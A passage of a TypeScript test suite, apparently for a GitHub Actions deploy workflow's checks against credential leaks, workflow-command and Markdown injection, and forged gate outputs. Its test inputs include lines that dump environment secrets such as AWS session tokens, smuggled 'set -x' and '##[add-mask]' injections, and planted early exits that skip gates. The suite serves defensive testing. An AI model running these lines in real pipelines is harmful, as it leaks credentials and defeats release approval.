    for (const line of ["jq -n 'env' >/dev/null", 'jq -n "env" >/dev/null']) {
      expect(added(line), line).toEqual([at(readBack, TRACE), at(readBack, PRINTS)])
    }
    for (const line of [
      `jq -n '$ENV' | mask | tee -a "$GITHUB_STEP_SUMMARY"`,
      "jq -rn 'env.AWS_SESSION_TOKEN' | mask",
      'cat /proc/self/environ | mask',
    ]) {
      expect(added(line), line).toEqual([at(readBack, PRINTS)])
    }
    // An AWS_ variable is no name the run owns either.
    expect(added('echo "$AWS_SESSION_TOKEN" | mask')).toEqual([at(readBack, OWN), at(readBack, PRINTS)])
    // Round 2's GUARDS-01: a # right after a substitution's ) hides nothing that prints.
    expect(added('echo $(true)#;set -x')).toEqual([at(readBack, TRACE)])
    expect(added('echo $(true)#;env | base64 -w0')).toEqual([at(readBack, TRACE)])
    // env as an object's key prints nothing, and a job with no credentials is no concern of this rule (a jq
    // program that is env alone is env handed to a program, which TRACE finds in every job).
    expect(added("jq -n '{env: 1}' >/dev/null")).toEqual([])
    expect(
      maskingFindings(
        plant(
          `          printf '%s' "$READBACK"`,
          `          jq -rn 'env.HOME' >/dev/null\n          printf '%s' "$READBACK"`,
          job('smoke-nonprod'),
        ),
      ),
    ).toEqual([])
  }, 30_000)

  // Round 4: a job that holds no credential and writes no record runs repository code by design, but its runs
  // are read through SHELL_TABLE too, so what DPW-07 reads in them (env, set -x, a summary written past mask) is
  // read as bash runs it, and a form the table doesn't name is refused at its line (17, where the plant stands).
  it('refuses a form SHELL_TABLE doesn’t name in every other job, and reads env by any path', () => {
    const plan = (line: string) =>
      maskingFindings(
        addedBefore('gate', 'Plan', `          printf '%s\\n' "$PLAN" >>"$GITHUB_OUTPUT"\n`, `          ${line}\n`),
      )
    for (const line of ['eval "$x"', 'source x', 'echo "$(<x)"', `echo "\${x/a/b}"`, 'echo a |& cat', 'echo a{b,c}']) {
      expect(plan(line), line).toEqual([at('gate (Plan), line 18', AS_BASH)])
    }
    expect(plan('/usr/bin/env')).toEqual([at('gate (Plan)', TRACE)])
    // Round 4's GUARDS-04 and GUARDS-02: env or printenv handed to a program by its path, or quoted, which bash
    // hands on with its quotes taken off; only the words a command is given read them.
    for (const line of [
      'sudo /usr/bin/env',
      'xargs /usr/bin/env </dev/null',
      'sudo "printenv"',
      "xargs 'env' </dev/null",
      "find . -maxdepth 0 -exec 'printenv' ';'",
      'sudo "/usr/bin/env"',
    ]) {
      expect(plan(line), line).toEqual([at('gate (Plan)', TRACE)])
    }
    expect(plan('( printenv )')).toEqual([at('gate (Plan), line 18', AS_BASH), at('gate (Plan)', TRACE)])
  })

  it('holds the repository', () => {
    expect(maskingFindings(workflows)).toEqual([])
  })

  // The preamble's filter, run with bash and sed as the deploy jobs run it: an account id goes wherever it
  // stands, side by side included, and a commit or digest stays whole, even one holding twelve digits.
  it('the filter blanks an account id and keeps a commit and a digest whole', () => {
    const account = '4'.repeat(12)
    const commit = '0123456789'.repeat(4)
    const digest = `sha256:${'1'.repeat(12)}${'c'.repeat(52)}`
    const lines = [
      ['arn', 'aws', 'iam', '', account, 'role/x'].join(':'),
      `${account}.dkr.ecr.ap-southeast-1.amazonaws.com/hearth-server`,
      `:${account}:${account}:${account}:`,
      account,
      `account ${account}, Account ${account}`,
      `release ${commit}:${digest}`,
      `tag sha-${commit}-11-1`,
    ]
    const result = spawnSync('bash', ['-c', `${PREAMBLE}\nmask`], {
      input: `${lines.join('\n')}\n`,
      encoding: 'utf8',
      env: { PATH: process.env.PATH ?? '', RUNNER_TEMP: '/nowhere' },
    })
    expect(result.status).toBe(0)
    const [stop, ...shown] = result.stdout.split('\n')
    expect(stop).toMatch(/^::stop-commands::[0-9a-f]{32}$/)
    expect(shown).toEqual([
      ['arn', 'aws', 'iam', '', '***', 'role/x'].join(':'),
      '***.dkr.ecr.ap-southeast-1.amazonaws.com/hearth-server',
      ':***:***:***:',
      '***',
      'account ***, Account ***',
      `release ${commit}:${digest}`,
      `tag sha-${commit}-11-1`,
      '',
    ])
  })

  // Round 5's fourth attack (EXPAND-A4-01, A4-02). The runner reads ##[name] anywhere in a line, and ::name::
  // at its start, as a workflow command, and add-mask hides its value in every later line and in the step
  // summary and drops any job output it would change. The CLI prints a template's text as it is: a release
  // whose stack description ended ##[add-mask] and a host hid that host in prod-plan's diff, the one thing
  // the approver reads, and a Tasks output ##[add-mask]true dropped services_started, and with it the
  // pipeline's rollback. The runs before the credentials action read what other jobs made as well: GNU tar
  // names an unknown pax header keyword of the build's image archive on stderr as it is, line breaks and
  // all (EXPAND-A1-01, round 6). So every run of a credentialed job but the account id's mask starts with
  // STOP_HEAD, which stops the runner reading commands, under a token of its own, before anything it runs
  // reads or prints.
  it('stops the runner reading workflow commands before any credentialed run but the mask reads or prints anything (EXPAND-A4-01, A4-02; EXPAND-A1-01, round 6)', () => {
    expect(STOP_COMMANDS).toBe('stop_token=$(openssl rand -hex 16)\necho "::stop-commands::$stop_token"')
    expect(STOP_HEAD.startsWith('set -euo pipefail\n')).toBe(true)
    expect(STOP_HEAD.endsWith(`\n${STOP_COMMANDS}`)).toBe(true)
    expect(PREAMBLE.startsWith(`${STOP_HEAD}\n`)).toBe(true)
    let before = 0
    let after = 0
    for (const each of workflowJobs(deployText)) {
      const steps = parsedSteps(each)
      const credentials = steps.findIndex(step => step.uses?.startsWith('aws-actions/configure-aws-credentials@'))
      if (credentials < 0) continue
      steps.forEach((step, index) => {
        if (step.run === undefined || step.run === MASK_RUN) return
        if (index < credentials) before += 1
        else after += 1
        const code = step.run.split('\n').filter(line => line.trim() !== '' && !line.trimStart().startsWith('#'))
        expect(code.slice(0, 3), `${each.id} (${step.name})`).toEqual([
          'set -euo pipefail',
          ...STOP_COMMANDS.split('\n'),
        ])
        expect(step.run.startsWith(`${STOP_HEAD}\n`), `${each.id} (${step.name})`).toBe(true)
      })
    }
    // Before the credentials: the release (or a rollback job's two releases), the artifacts' names, the
    // image's check (nonprod and prod), the assembly's (and prod-plan's of the previous assembly), the fast
    // re-check (nonprod and prod), CLI_FETCH and CLI_CHECK: seven in each deploy job, six in prod-plan and
    // five in each rollback job.
    expect(before).toBe(30)
    expect(after).toBe(32)
    // The token is new each run, and the line naming it is the first the run prints.
    const tokens = [0, 1].map(() => {
      const result = spawnSync('bash', ['-c', `${PREAMBLE}\necho after`], {
        encoding: 'utf8',
        env: { PATH: process.env.PATH ?? '', RUNNER_TEMP: '/nowhere' },
      })
      expect(result.status).toBe(0)
      const [first, second] = result.stdout.split('\n')
      expect(second).toBe('after')
      return /^::stop-commands::([0-9a-f]{32})$/.exec(first ?? '')?.[1]
    })
    expect(tokens[0]).toBeDefined()
    expect(tokens[0]).not.toBe(tokens[1])
    // A run that drops the two lines, or stops them only after its first command, is refused, before the
    // credentials action as after it.
    const indented = (text: string) => text.replace(/^/gm, '          ')
    for (const [id, name] of [
      ['nonprod', 'Deploy Services'],
      ['nonprod', 'Check and unpack the image'],
      ['prod', 'The pinned CDK CLI'],
      ['prod-plan', 'Check the assembly'],
      ['rollback-prod', "This run's release and the previous one"],
    ] as const) {
      const step = stepText(deployText, id, name)
      for (const changed of [
        edited(step, `${indented(STOP_COMMANDS)}\n`, ''),
        edited(step, `${indented(STOP_COMMANDS)}\n`, `          echo starting\n${indented(STOP_COMMANDS)}\n`),
      ]) {
        expect(maskingFindings(withText(DEPLOY, edited(deployText, step, changed, job(id))))).toContain(
          at(`${id} (${name})`, STOPS),
        )
      }
    }
  })
  // INPUTS-A1-01 (round 6). The approver reads prod-plan's diff in the job summary, which GitHub renders as
  // GitHub Flavored Markdown, and the diff prints a release's own text as it is (an annotation, a validation
  // report, a template's string): written inside a fenced block, a line of three backticks ended the block
  // and a line starting <!-- then hid the real diff in an HTML comment, and Markdown reads a lone carriage
  // return as a line's end too. So the run writes the diff as an indented code block, every line four spaces
  // in and every carriage return a line break first: no line of the diff can end the block or open HTML.
  // And four spaces a line can make the text five times longer, so it is cut short of a step summary's 1 MiB.
  it('writes the approver’s diff as one indented code block no line of it can end, under a summary’s 1 MiB (INPUTS-A1-01, round 6)', () => {
    const scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw07-diff-'))
    // The pinned Diff run, with a stand-in CLI that prints the given bytes as its diff.
    const summary = (diff: Buffer) => {
      const temp = mkdtempSync(join(scratch, 'runner-'))
      execFileSync('mkdir', ['-p', join(temp, 'aws-cdk', 'package', 'bin')])
      writeFileSync(join(temp, 'printed'), diff)
      writeFileSync(join(temp, 'aws-cdk', 'package', 'bin', 'cdk'), `#!/bin/sh\ncat '${join(temp, 'printed')}'\n`, {
        mode: 0o755,
      })
      writeFileSync(join(temp, 'summary.md'), '')
      // (An aws for PLAN_BASIS's read of the stage before the diff, round 11, answering that no stack exists.)
      execFileSync('mkdir', ['-p', join(temp, 'bin')])
      writeFileSync(join(temp, 'bin', 'aws'), "#!/bin/sh\necho 'Stack with id x does not exist' >&2\nexit 254\n", {
        mode: 0o755,
      })
      const result = spawnSync('bash', ['-c', DIFF_RUN], {
        encoding: 'utf8',
        env: {
          PATH: `${join(temp, 'bin')}:${process.env.PATH ?? ''}`,
          HOME: temp,
          RUNNER_TEMP: temp,
          GITHUB_STEP_SUMMARY: join(temp, 'summary.md'),
          GITHUB_OUTPUT: join(temp, 'output'),
          STAGE: 'prod',
          MODE: 'deploy',
          RESTORE: 'none',
        },
      })
      expect(result.status).toBe(0)
      return readFileSync(join(temp, 'summary.md'), 'utf8')
    }
    try {
      const diff = [
        'Stack prod/Services (Hearth-prod-Services)',
        '```',
        '<!-- everything after this is hidden',
        '',
        'a line\r```\r<!--\rafter a carriage return',
        '\t<details>',
        '[~] AWS::ECS::TaskDefinition Services/ApiTask replace',
      ].join('\n')
      const lines = summary(Buffer.from(`${diff}\n`)).split('\n')
      expect(lines.slice(0, 2)).toEqual(["### What prod's deploy changes", ''])
      // Every line of the diff is four spaces in, a carriage return made a line break; then blank lines.
      expect(lines.slice(2, 13)).toEqual([
        '    Stack prod/Services (Hearth-prod-Services)',
        '    ```',
        '    <!-- everything after this is hidden',
        '    ',
        '    a line',
        '    ```',
        '    <!--',
        '    after a carriage return',
        '    \t<details>',
        '    [~] AWS::ECS::TaskDefinition Services/ApiTask replace',
        '',
      ])
      expect(lines.slice(13).every(line => line === '')).toBe(true)
      expect(lines.join('\n')).not.toContain('\r')
      // A diff of line breaks alone, each made five bytes, stays under a step summary's 1 MiB, and says it is cut.
      expect(DIFF_CUT).toBe(204800)
      const cut = summary(Buffer.alloc(3 * DIFF_CUT, '\n'))
      expect(Buffer.byteLength(cut)).toBeLessThan(1024 * 1024)
      expect(cut).toContain("The diff is cut at 200 KB here; the job's log holds it whole.")
      expect(
        cut
          .split('\n')
          .slice(2, 2 + DIFF_CUT)
          .every(line => line === '    '),
      ).toBe(true)
    } finally {
      rmSync(scratch, { recursive: true, force: true })
    }
  })
})

describe('DPW-08 (C11-D52): the way to prod', () => {
  const at = (id: string, rule: string) => `${DEPLOY}: DPW-08 ${id}: ${rule}`
  const RECHECK =
    "the fast re-check comes before the credentials and checks a deploy's ancestry (and in prod both digests) and any other mode's record id"
  const SAME_STEPS = "its steps are rollback-nonprod's but for the environment's name"

  it('finds each planted breakage', () => {
    expect(
      prodPathFindings(
        plant(
          '    needs: [gate, build, synth, synth-previous-prod, nonprod, prod-plan, prod-gate]\n',
          '    needs: [gate, build, synth, synth-previous-prod, nonprod, prod-plan]\n',
          job('prod'),
        ),
      ),
    ).toEqual([at('prod', 'needs prod-gate and prod-plan')])
    expect(
      prodPathFindings(
        plant('    cache-mode: none\n', '    cache-mode: none\n    environment: prod\n', job('prod-gate')),
      ),
    ).toEqual([
      at('prod-gate', 'names no environment and holds no id-token'),
      at('prod-gate', 'deploys nothing to prod: only prod and rollback-prod do'),
    ])
    const elif = [
      `          elif [ "$(jq -r '.id // ""' <<<"$newest")" != "$RECORD_ID" ]; then`,
      `            echo "fast re-check: nonprod's release records changed since the gate read them"`,
      '            exit 1',
      '',
    ].join('\n')
    expect(prodPathFindings(plant(elif, '', job('nonprod')))).toEqual([at('nonprod', RECHECK)])
    const recordCheck = [
      `          if [ "$(jq -r '.id // ""' <<<"$newest")" != "$RECORD_ID" ]; then`,
      `            echo "fast re-check: prod's release records changed since prod-gate read them"`,
      '            exit 1',
      '          fi',
      '',
    ].join('\n')
    expect(prodPathFindings(plant(recordCheck, '', job('prod')))).toEqual([at('prod', RECHECK)])
    expect(prodPathFindings(movedStep('prod', 'The fast re-check', 'What runs'))).toEqual([at('prod', RECHECK)])
    expect(
      prodPathFindings(
        plant(
          "(needs.gate.outputs.mode == 'deploy' && needs.smoke-nonprod.result == 'success') || needs.gate.outputs.mode == 'rollback'",
          "needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback'",
          job('prod-plan'),
        ),
      ),
    ).toEqual([at('prod-plan', "its if: requires smoke-nonprod's success for a deploy")])
    expect(prodPathFindings(copiedStep('prod', 'Take the restore stage down', 'rollback-prod', 'Probe'))).toEqual([
      at('rollback-prod', SAME_STEPS),
      at('rollback-prod', "deploys only the previous release's Tasks and Services"),
    ])
    expect(
      prodPathFindings(
        plant(
          '"repos/$REPO/actions/runs/$RUN_ID/jobs?per_page=100"',
          '"repos/$REPO/commits/$SHA/check-runs?per_page=100"',
          job('prod-gate'),
        ),
      ),
    ).toEqual([
      at(
        'prod-gate',
        "waits for main's check and migrations for a deploy alone, read from ci.yml's own run and its jobs",
      ),
      at('prod-gate', 'reads no check run, check suite or commit status'),
      at("prod-gate (main's own CI)", PINNED_08),
    ])
    expect(
      prodPathFindings(
        plant(
          '    needs: [gate, build, synth-previous-nonprod, nonprod, smoke-nonprod]\n',
          '    needs: [gate, synth-previous-nonprod, nonprod, smoke-nonprod]\n',
          job('rollback-nonprod'),
        ),
      ),
    ).toEqual([
      at(
        'rollback-nonprod',
        "needs build, takes this run's digest from build for a deploy and from the gate for a drill-smoke, and runs only once nonprod set services_started",
      ),
    ])
    expect(
      prodPathFindings(plant(" && needs.prod.outputs.services_started == 'true'", '', job('rollback-prod'))),
    ).toEqual([
      at(
        'rollback-prod',
        "needs build, takes this run's digest from build for a deploy and from the gate for a drill-smoke, and runs only once prod set services_started",
      ),
    ])
    expect(
      prodPathFindings(plant('      - name: Rolled back\n', '      - name: Rolled back, prod\n', job('rollback-prod'))),
    ).toEqual([at('rollback-prod (Rolled back)', PINNED_08), at('rollback-prod', SAME_STEPS)])
    // Each run the gates rest on is pinned whole: an early exit 0 or a forged output is found.
    const WAIT = "waits for main's check and migrations for a deploy alone, read from ci.yml's own run and its jobs"
    expect(
      prodPathFindings(addedBefore('prod-gate', "main's own CI", '          DEADLINE=', '          exit 0\n')),
    ).toEqual([at('prod-gate', WAIT), at("prod-gate (main's own CI)", PINNED_08)])
    expect(
      prodPathFindings(
        addedBefore(
          'prod-gate',
          'The prod gate',
          '          if ! OUT=$(node',
          '          echo current_prod_id= >>"$GITHUB_OUTPUT"; exit 0\n',
        ),
      ),
    ).toEqual([
      at('prod-gate', 'runs history.ts prod-gate with the mode'),
      at('prod-gate (The prod gate)', PINNED_08),
      at('prod-gate (The prod gate)', OUTPUT_PINNED),
    ])
    expect(
      prodPathFindings(
        addedBefore('prod', 'The fast re-check', '          newest=$(newest_release prod)\n', '          exit 0\n'),
      ),
    ).toEqual([at('prod', RECHECK)])
    expect(
      prodPathFindings(
        addedBefore(
          'nonprod',
          'The fast re-check',
          '          newest=$(newest_release nonprod)\n',
          '          exit 0\n',
        ),
      ),
    ).toEqual([at('nonprod', RECHECK)])
    expect(
      prodPathFindings(
        addedBefore(
          'gate',
          'The pull request that made this commit, and its checks',
          '          PULLS=',
          `          jq -n '{pull: 1, check: "success", migrations: "success"}' >"$RUNNER_TEMP/checks.json"; exit 0\n`,
        ),
      ),
    ).toEqual([
      at('gate', "reads its pull request's check and migrations from ci.yml's own run on its head and that run's jobs"),
      at('gate (The pull request that made this commit, and its checks)', PINNED_08),
    ])
    // SECURITY-01: a run chosen without its head repository and branch could be another fork's.
    expect(
      prodPathFindings(
        plant(
          ' and ($pull.head.repo.id | type == "number") and .head_repository.id == $pull.head.repo.id and .head_branch == $pull.head.ref',
          '',
          job('gate'),
        ),
      ),
    ).toEqual([
      at('gate', "reads its pull request's check and migrations from ci.yml's own run on its head and that run's jobs"),
      at('gate (The pull request that made this commit, and its checks)', PINNED_08),
    ])
  })

  // ACTIONS-01: a smoke re-run on its own keeps its job's outputs from an earlier attempt, so it would judge
  // a read-back of what ran then: each smoke refuses one from another attempt.
  it('finds a smoke that could judge a read-back from another attempt', () => {
    const stale = (smoke: string, source: string) =>
      at(
        smoke,
        `judges only the read-back ${source} wrote in this attempt: ${source} outputs attempt, and the smoke refuses first unless it is GITHUB_RUN_ATTEMPT`,
      )
    const output = `      attempt: \${{ github.run_attempt }}\n`
    expect(prodPathFindings(plant(output, '', job('nonprod')))).toEqual([stale('smoke-nonprod', 'nonprod')])
    expect(prodPathFindings(plant(output, '', job('rollback-prod')))).toEqual([stale('resmoke-prod', 'rollback-prod')])
    expect(
      prodPathFindings(
        plant(
          `          ATTEMPT: \${{ needs.prod.outputs.attempt }}\n`,
          `          ATTEMPT: \${{ github.run_attempt }}\n`,
          job('smoke-prod'),
        ),
      ),
    ).toEqual([stale('smoke-prod', 'prod')])
    const check = `${indent(SMOKE_ATTEMPT, 10)}\n`
    expect(prodPathFindings(plant(check, '', job('resmoke-nonprod')))).toEqual([
      stale('resmoke-nonprod', 'rollback-nonprod'),
      at('resmoke-nonprod (Smoke)', PINNED_08),
    ])
    // The check after smoke.ts has judged, or in a step of its own beside it, comes too late.
    const smokeLine = '          node infra/scripts/deploy/smoke.ts '
    const moved = edited(
      edited(deployText, check, '', job('smoke-nonprod')),
      smokeLine,
      `${check}${smokeLine}`,
      job('smoke-nonprod'),
    )
    expect(prodPathFindings(withText(DEPLOY, moved))).toEqual([
      stale('smoke-nonprod', 'nonprod'),
      at('smoke-nonprod (Smoke)', PINNED_08),
    ])
    expect(prodPathFindings(copiedStep('smoke-prod', 'Smoke', 'smoke-prod', 'Smoke'))).toEqual([
      stale('smoke-prod', 'prod'),
      at('smoke-prod (Smoke)', PINNED_08),
    ])
  })

  // Round 2's ACTIONS-03: a re-run of prod alone (or of the failed jobs) keeps prod-plan's outputs, and so its
  // diff, from an earlier attempt, while what prod runs may have changed since; prod's fast re-check holds
  // the approval to prod-plan's attempt and to the record prod-gate read, in every mode.
  it('finds a prod approval not held to prod-plan’s diff of this attempt', () => {
    const PLAN =
      "outputs its attempt, which prod's fast re-check holds to its own, its diff's read of the restore stage, which prod's down holds the stage to, and its read of the stage it diffed, which prod's What runs holds the stage to, and nothing else"
    const attempt = `      attempt: \${{ github.run_attempt }}\n`
    // Round 11: the stage prod-plan diffed (basis, PLAN_BASIS's read) is an output of the Diff step alone, and
    // prod's What runs reads it as BASIS (pinned with its env, DPW-06).
    const basis = `      basis: \${{ steps.diff.outputs.basis }}\n`
    expect(prodPathFindings(plant(basis, '', job('prod-plan')))).toEqual([at('prod-plan', PLAN)])
    expect(prodPathFindings(plant(basis, `      basis: \${{ steps.diff.outputs.down }}\n`, job('prod-plan')))).toEqual([
      at('prod-plan', PLAN),
    ])
    const BASIS_ENV = `          BASIS: \${{ needs.prod-plan.outputs.basis }}\n`
    expect(deployStepFindings(plant(BASIS_ENV, '', job('prod'))).join('\n')).toMatch(/DPW-06 prod/)
    expect(
      deployStepFindings(
        plant(BASIS_ENV, `          BASIS: \${{ needs.prod-gate.outputs.current_prod_id }}\n`, job('prod')),
      ).join('\n'),
    ).toMatch(/DPW-06 prod/)
    const down = `      down: \${{ steps.diff.outputs.down }}\n`
    expect(prodPathFindings(plant(`    outputs:\n${attempt}${down}`, '', job('prod-plan')))).toEqual([
      at('prod-plan', PLAN),
    ])
    expect(prodPathFindings(plant(attempt, `      attempt: \${{ github.run_id }}\n`, job('prod-plan')))).toEqual([
      at('prod-plan', PLAN),
    ])
    expect(prodPathFindings(plant(attempt, `${attempt}      diff: \${{ github.run_id }}\n`, job('prod-plan')))).toEqual(
      [at('prod-plan', PLAN)],
    )
    // A restore taken down is held to what prod-plan's diff read (INPUTS-A1-01, the eighth review's first
    // attack): its down output, from the Diff step by its id, and prod's PLANNED, which reads it.
    const DOWN = "takes the restore stage down only as prod-plan's diff read it (PLANNED, its down output)"
    expect(prodPathFindings(plant(down, '', job('prod-plan')))).toEqual([at('prod-plan', PLAN)])
    expect(prodPathFindings(plant(down, `      down: \${{ needs.gate.outputs.restore }}\n`, job('prod-plan')))).toEqual(
      [at('prod-plan', PLAN)],
    )
    expect(prodPathFindings(plant('        id: diff\n', '', job('prod-plan')))).toEqual([at('prod', DOWN)])
    const planned = `          PLANNED: \${{ needs.prod-plan.outputs.down }}\n`
    expect(prodPathFindings(plant(planned, '', job('prod')))).toEqual([at('prod', DOWN)])
    expect(
      prodPathFindings(plant(planned, `          PLANNED: \${{ needs.prod-plan.outputs.attempt }}\n`, job('prod'))),
    ).toEqual([at('prod', DOWN)])
    expect(
      prodPathFindings(plant(`          PLAN_ATTEMPT: \${{ needs.prod-plan.outputs.attempt }}\n`, '', job('prod'))),
    ).toEqual([at('prod', RECHECK)])
    expect(
      prodPathFindings(
        plant(
          '          if [ "$PLAN_ATTEMPT" != "$GITHUB_RUN_ATTEMPT" ]; then\n',
          '          if false; then\n',
          job('prod'),
        ),
      ),
    ).toEqual([at('prod', RECHECK)])
  })

  // The same, run with bash: prod's fast re-check from deploy.yml against a stand-in gh and a real git.
  it('refuses a prod approval from another attempt, and a record that moved since prod-gate, in every mode', () => {
    const prod = workflowJobs(deployText).find(each => each.id === 'prod')
    const run = (prod === undefined ? [] : parsedSteps(prod)).find(step => step.name === 'The fast re-check')?.run
    expect(run).toBeDefined()
    const repo = mkdtempSync(join(tmpdir(), 'hearth-dpw08-'))
    try {
      const git = (args: readonly string[]) =>
        execFileSync(
          'git',
          [
            '-c',
            'user.name=hearth-test',
            '-c',
            `user.email=${['test', 'example.invalid'].join('@')}`,
            '-c',
            'commit.gpgsign=false',
            '-c',
            'tag.gpgSign=false',
            '-c',
            'core.hooksPath=/dev/null',
            ...args,
          ],
          { cwd: repo, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] },
        ).trim()
      git(['init', '-q', '-b', 'main'])
      git(['commit', '-q', '--allow-empty', '-m', 'A'])
      const older = git(['rev-parse', 'HEAD'])
      git(['commit', '-q', '--allow-empty', '-m', 'B'])
      const head = git(['rev-parse', 'HEAD'])
      const record = (id: number) => ({
        id,
        task: 'hearth-release',
        environment: 'prod',
        payload: {
          schema: 1,
          kind: 'deploy',
          commit: older,
          digest: `sha256:${'1'.repeat(64)}`,
          migratedCommit: null,
          services: { api: 'hearth-prod-api:3', realtime: 'hearth-prod-realtime:3', worker: 'hearth-prod-worker:3' },
        },
      })
      const digest = `sha256:${'2'.repeat(64)}`
      const recheck = (env: Record<string, string>) =>
        spawnSync('bash', ['-c', `gh() { printf '%s\\n' "$RECORDS"; }\n${run ?? ''}`], {
          cwd: repo,
          encoding: 'utf8',
          env: {
            PATH: process.env.PATH ?? '',
            HOME: repo,
            GITHUB_SHA: head,
            GITHUB_RUN_ATTEMPT: '2',
            REPO: 'example/hearth',
            MODE: 'deploy',
            TARGET: 'prod',
            RECORD_ID: '7',
            PLAN_ATTEMPT: '2',
            BUILD_DIGEST: digest,
            NONPROD_DIGEST: digest,
            RECORDS: JSON.stringify([record(7)]),
            ...env,
          },
        })
      const said = (env: Record<string, string>) => {
        const result = recheck(env)
        return { status: result.status, said: result.stdout.trim().split('\n').at(-1) ?? '' }
      }
      expect(said({}).status).toBe(0)
      expect(said({ MODE: 'rollback' }).status).toBe(0)
      const stale = {
        status: 1,
        said: "fast re-check: prod-plan's diff is from another attempt of this run: re-run prod-plan, which re-runs prod-gate and this job after it, or, once a prod release has been recorded since this run's gate, re-run all jobs (while the commit is main's head) or dispatch afresh (deploy-and-rollback.md)",
      }
      expect(said({ PLAN_ATTEMPT: '1' })).toEqual(stale)
      expect(said({ PLAN_ATTEMPT: '' })).toEqual(stale)
      expect(said({ MODE: 'rollback', PLAN_ATTEMPT: '1' })).toEqual(stale)
      // A restore is approved against prod-plan's diff too (the seventh review's fourth attack), so its attempt
      // is held as a deploy's is, and its record still is.
      expect(said({ TARGET: 'restore' }).status).toBe(0)
      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '' })).toEqual(stale)
      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '1' })).toEqual(stale)
      const moved = { status: 1, said: "fast re-check: prod's release records changed since prod-gate read them" }
      // A deploy too: a rollback recorded after prod-gate read the records, though its commit is an ancestor.
      expect(
        said({
          RECORDS: JSON.stringify([record(7), { ...record(8), payload: { ...record(8).payload, kind: 'rollback' } }]),
        }),
      ).toEqual(moved)
      expect(said({ TARGET: 'restore', RECORD_ID: '6' })).toEqual(moved)
      // A first deploy: no record then, and none now.
      expect(said({ RECORDS: '[]', RECORD_ID: '' }).status).toBe(0)
    } finally {
      rmSync(repo, { recursive: true, force: true })
    }
  })

  // Round 3's SCRIPTS-03: the fast re-checks' reader, run with bash and jq, ignores what history.ts ignores, a
  // value that ends in a newline among them (jq's $ matches before a final newline, JavaScript's doesn't),
  // and names the same newest record.
  it('reads the newest release record as history.ts does, ignoring a value that ends in a newline', () => {
    const commit = 'a'.repeat(40)
    const services = (revision: string) => ({
      api: `hearth-prod-api:${revision}`,
      realtime: 'hearth-prod-realtime:3',
      worker: 'hearth-prod-worker:3',
    })
    const record = (id: number, payload: Record<string, unknown> = {}) => ({
      id,
      task: 'hearth-release',
      environment: 'prod',
      payload: {
        schema: 1,
        kind: 'deploy',
        commit,
        digest: `sha256:${'1'.repeat(64)}`,
        migratedCommit: null,
        services: services('3'),
        ...payload,
      },
    })
    const records = [
      record(202),
      record(303, { commit: `${commit}\n`, services: services('9') }),
      record(304, { digest: `sha256:${'1'.repeat(64)}\n`, services: services('9') }),
      record(305, { migratedCommit: `${commit}\n`, services: services('9') }),
      record(306, { services: services('9\n') }),
      record(307, { services: { ...services('9'), worker: 'hearth-prod-worker:9\n' } }),
    ]
    const result = spawnSync(
      'bash',
      ['-c', `set -euo pipefail\ngh() { printf '%s\\n' "$RECORDS"; }\n${NEWEST_RELEASE}\nnewest_release prod`],
      {
        encoding: 'utf8',
        env: { PATH: process.env.PATH ?? '', REPO: 'example/hearth', RECORDS: JSON.stringify(records) },
      },
    )
    const parsed = parseReleaseRecords(records, 'prod')
    expect(parsed.records.map(each => each.id)).toEqual([202])
    expect(parsed.ignored).toEqual([303, 304, 305, 306, 307])
    expect({ status: result.status, newest: JSON.parse(result.stdout) }).toEqual({
      status: 0,
      newest: { id: 202, commit, revision: 3 },
    })
    expect(result.stderr.trim().split('\n')).toEqual(
      parsed.ignored.map(
        id => `fast re-check: ignored hearth-release record ${id} in prod: its payload fails validation`,
      ),
    )
  })

  // ROLLBACK-02: each deploy job outputs what its AWS_CHECK found running, for its rollback job's auto check.
  it('finds a deploy job that doesn’t output what it replaced', () => {
    const replaced = `      replaced: \${{ steps.aws.outputs.replaced }}\n`
    expect(prodPathFindings(plant(replaced, '', job('nonprod')))).toEqual([
      at('nonprod', "outputs replaced from its AWS_CHECK step, for rollback-nonprod's auto check"),
    ])
    expect(
      prodPathFindings(plant(replaced, `      replaced: \${{ steps.release.outputs.release }}\n`, job('prod'))),
    ).toEqual([at('prod', "outputs replaced from its AWS_CHECK step, for rollback-prod's auto check")])
  })

  // Round 12's fourth iteration: only AWS_CHECK_ENV's pin held the rollback's REPLACED to that output, and it moves
  // with the workflow, so REPLACED read from the gate's current_<env>, which for a deploy is the previous release
  // itself, passed every rule and the auto check's second test with it. Each rollback job's REPLACED is now its
  // deploy job's replaced output as written, whatever the pin says.
  it('finds a rollback that judges what its deploy replaced by anything but that deploy’s output', () => {
    const judges = (stage: string) =>
      at(`rollback-${stage}`, `judges what ${stage} replaced by REPLACED, its deploy job's replaced output as written`)
    const replaced = (stage: string) => `          REPLACED: \${{ needs.${stage}.outputs.replaced }}\n`
    // Both rollback jobs alike, as an author would write them, so the rule that holds their steps alike stays quiet.
    for (const output of ['current_<env>', 'previous_<env>_commit', 'current_<env>_id'] as const) {
      const to = (stage: string) => `          REPLACED: \${{ needs.gate.outputs.${output.replace('<env>', stage)} }}\n`
      const planted = withText(
        DEPLOY,
        edited(
          edited(deployText, replaced('nonprod'), to('nonprod'), job('rollback-nonprod')),
          replaced('prod'),
          to('prod'),
          job('rollback-prod'),
        ),
      )
      expect(prodPathFindings(planted), output).toEqual([judges('nonprod'), judges('prod')])
    }
    // One job alone, its other environment's output among them.
    expect(prodPathFindings(plant(replaced('nonprod'), replaced('prod'), job('rollback-nonprod')))).toContain(
      judges('nonprod'),
    )
  })

  // Round 12's second iteration: only JOB_STEPS, which moves with the workflow, held the step that writes
  // services_started before the Services deploy. Moved after the Probe (JOB_STEPS with it), GitHub's default
  // success() skipped it once the Probe failed, every rollback job's if: read services_started as '', and a
  // release whose probe failed stayed live with no rollback. The rule reads the workflow alone, so each move
  // here is found whatever JOB_STEPS says.
  it('finds the step that writes services_started after any step from the Services deploy on', () => {
    const third = { nonprod: 'drill-break', prod: 'Take the restore stage down' } as const
    const later = (stage: 'nonprod' | 'prod') =>
      at(
        stage,
        `writes services_started (the step its output reads) before Deploy Services, Roll back to the target, ${third[stage]}, Probe and Read back what runs, each there, so a failure from the Services deploy on starts rollback-${stage}`,
      )
    const mark = 'Services are about to change'
    // The mark moved before another step in both deploy jobs, as an author would move it.
    const moved = (before: string) => {
      let text = deployText
      for (const stage of ['nonprod', 'prod']) {
        const step = stepText(text, stage, mark)
        const without = edited(text, step, '', job(stage))
